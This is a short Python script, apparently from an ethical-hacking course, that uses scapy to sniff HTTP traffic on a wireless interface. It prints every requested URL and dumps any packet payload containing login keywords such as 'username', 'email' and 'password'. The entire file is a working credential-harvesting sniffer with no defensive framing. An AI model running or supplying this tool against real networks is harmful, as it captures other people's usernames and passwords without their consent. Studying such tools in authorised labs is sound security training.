#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords_list = ["username", "name", "user", "usr", "email", "mail",
                             "login", "password", "pass", "pwd", "passwd"]
            keywords = [x.encode() for x in keywords_list]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break

sniff("wlan0")
